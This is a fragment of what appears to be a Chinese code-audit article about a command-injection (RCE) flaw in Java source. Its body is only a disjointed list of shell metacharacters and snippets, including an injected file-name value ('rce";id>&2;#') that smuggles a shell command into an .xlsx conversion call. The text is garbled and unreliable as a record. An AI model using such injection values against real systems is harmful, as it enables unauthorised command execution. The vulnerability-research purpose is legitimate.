#  代码审计JAVA源码RCE漏洞记录-学员投稿  
原创 知名小朋友
                    知名小朋友  进击安全   2026-05-15 01:28  
  
```
/bin/sh -c
sh -c
;
|
$()
`
&
execFor
"..."
"
convert()
.xlsx
#
"
.xlsx"
"..."
.xlsx
"
;
|
&&
#
rce"
"
;
id
>&2
redirectErrorStream(true)
;
#
_date.xlsx" --outdir "/tmp"
rce";id>&2;#
templateFile
.xlsx
```  
  
